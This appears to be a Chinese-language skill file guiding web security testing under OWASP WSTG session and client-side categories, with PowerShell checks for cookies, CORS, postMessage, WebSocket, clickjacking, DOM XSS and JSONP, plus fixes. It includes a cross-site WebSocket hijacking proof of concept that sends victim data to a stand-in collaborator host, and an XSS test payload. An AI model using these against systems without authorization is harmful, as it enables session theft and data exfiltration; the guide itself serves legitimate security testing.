---
name: session-client-side
description: 会话管理与客户端测试阶段详细指南 (WSTG-SESS / WSTG-CLNT) - Cookie 安全、CORS、postMessage、WebSocket、点击劫持、DOM XSS
---

# Phase 5: 会话管理与客户端测试 (WSTG-SESS / WSTG-CLNT)

## 测试目标

1. 会话全生命周期（Cookie 属性、会话固定、登出失效、超时、并发）
2. 同源策略实现（CORS、postMessage、JSONP）
3. WebSocket 安全（CSWSH、消息鉴权）
4. 客户端注入（DOM XSS）与点击劫持

---

## 5.1 会话管理 (WSTG-SESS)

### 检查点

- [ ] Cookie 属性：HttpOnly、Secure、SameSite、Path/Domain 范围
- [ ] 会话固定：登录前后 session 值是否变化
- [ ] 登出后旧 session 是否仍可用
- [ ] 空闲超时与绝对超时
- [ ] 并发登录策略
- [ ] session ID 熵值 / 可预测性

### 测试步骤

```powershell
# Cookie 属性检查
$resp = Invoke-WebRequest -Uri "$TARGET_URL/login" -Method Post -Body @{ username = "u"; password = "p" } -UseBasicParsing -ErrorAction SilentlyContinue
$resp.Headers["Set-Cookie"]

# 判定：
# 缺 HttpOnly  → XSS 可窃取会话（中危）
# 缺 Secure    → 可被明文窃听（中危）
# SameSite=None 且无 CSRF token → 配合 CSRF 利用（高危）
```

```powershell
# 会话固定验证：
# 1. 未登录访问，记录 Cookie 值 S1
# 2. 登录，再记录 Cookie 值 S2
# 3. S1 == S2（仅登录态标记变化）→ 会话固定漏洞

# 登出失效验证：
# 1. 登出后拿旧 Cookie 再请求登录后页面
# 2. 仍返回 200 → 会话未销毁
```

### 修复建议

登录成功即重建 session；HttpOnly + Secure + SameSite；登出服务端销毁；合理超时与并发策略。

---

## 5.2 CORS 测试

### 测试原理

服务端 ACAO 反射 Origin 且允许带凭据 → 任意网站可跨域读取已登录用户的响应。

```powershell
# 反射测试：带任意 Origin + 有效会话请求
$resp = Invoke-WebRequest -Uri "$TARGET_URL/api/me" -Headers @{ Origin = "https://evil.example.com"; Cookie = "session=VALID" } -UseBasicParsing -ErrorAction SilentlyContinue
"ACAO: $($resp.Headers['Access-Control-Allow-Origin'])"
"ACAC: $($resp.Headers['Access-Control-Allow-Credentials'])"
```

| 场景 | 判定 |
|---|---|
| ACAO 反射任意 Origin + `Credentials: true` | 严重 |
| ACAO: `*` + `Credentials: true` | 浏览器拦截但其他端可能利用，记录 |
| `null` Origin 被接受 | 高危（sandbox iframe 可利用） |

### 修复建议

Origin 白名单精确匹配；敏感接口不反射 Origin；`null` 不进白名单。

---

## 5.3 postMessage 测试

### 检查点

- [ ] `addEventListener("message")` 是否校验 `event.origin`
- [ ] `postMessage` 是否用 `"*"` 作 targetOrigin
- [ ] 消息内容是否直达 sink（innerHTML/eval/location）

```powershell
# 前端 JS 可访问时搜索危险模式
$js = (Invoke-WebRequest -Uri "$TARGET_URL/app.js" -UseBasicParsing).Content
if ($js -match 'postMessage\([^)]*"\*"') { Write-Host "[!] postMessage 使用 * targetOrigin" }
if ($js -match 'addEventListener\(\s*[''"]message') { Write-Host "[*] 存在 message 监听，需人工确认 origin 校验" }
```

### 判定标准

监听处无 origin 校验 → 高危（配合可 XSS 页面/开放重定向可跨域发指令）。

### 修复建议

监听处严格白名单 origin；不用 `*`；消息数据按不可信输入校验。

---

## 5.4 WebSocket 测试

### 检查点

- [ ] 握手是否校验 Origin 头（CSWSH：跨站 WebSocket 劫持）
- [ ] 连接后每条消息是否做鉴权（握手有 Cookie ≠ 消息鉴权）
- [ ] 是否用 wss://（非 ws://）

```powershell
# CSWSH 验证：伪造 Origin 握手并发消息
@'
<html><body><script>
var ws = new WebSocket("wss://TARGET_DOMAIN/ws");
ws.onopen = () => ws.send('{"action":"query","target":"victim_data"}');
ws.onmessage = (e) => fetch("https://COLLABORATOR/log?d=" + encodeURIComponent(e.data));
</script></body></html>
'@ | Out-File -Encoding utf8 cswsh-poc.html
# 判定：伪造 Origin 握手成功且消息返回数据 → 高危（PoC 仅记录，不投放）
```

### 修复建议

握手校验 Origin 白名单；每条消息做授权校验；敏感操作使用一次性 ticket。

---

## 5.5 点击劫持

```powershell
$resp = Invoke-WebRequest -Uri "$TARGET_URL" -Method Head -UseBasicParsing
"XFO: $($resp.Headers['X-Frame-Options'])"
"CSP: $($resp.Headers['Content-Security-Policy'])"
# XFO 与 CSP frame-ancestors 均缺失 → 可被 iframe 嵌套（仅敏感操作页面算漏洞）
```

### 修复建议

CSP `frame-ancestors 'self'` 或 `X-Frame-Options: DENY`；敏感操作用二次确认。

---

## 5.6 DOM XSS 与 JSONP

### Source → Sink 分析

Source（攻击可控）：`location.hash/search`、`document.referer`、`window.name`、postMessage 数据
Sink（危险汇）：`innerHTML`、`document.write`、`eval`、`setTimeout(str)`、`location=`、`jQuery.html()`

```powershell
# 浏览器控制台验证（PowerShell 域外操作）：
# 访问 目标页#<img src=x onerror=alert(1)>，观察是否执行
```

```powershell
# JSONP 回调可控检查
$resp = Invoke-WebRequest -Uri "$TARGET_URL/api/data?callback=evilFunc" -UseBasicParsing
if ($resp.Content -match 'evilFunc\s*\(') { Write-Host "[!] JSONP 回调函数可控，检查是否返回敏感数据" }
```

### 判定标准

source 无过滤直达 sink → DOM XSS（用浏览器/无头浏览器确认执行）；JSONP 返回敏感数据 → 中危。

## 误报说明

- CORS `*` 在公开只读接口可能是刻意设计，按接口敏感度评级
- postMessage/WebSocket 需结合前端代码确认，仅有响应证据时标注"需代码审计确认"

## 输出格式

| 漏洞类型 | 位置 | 参数 | Payload | 证据 | 风险 | 修复建议 |
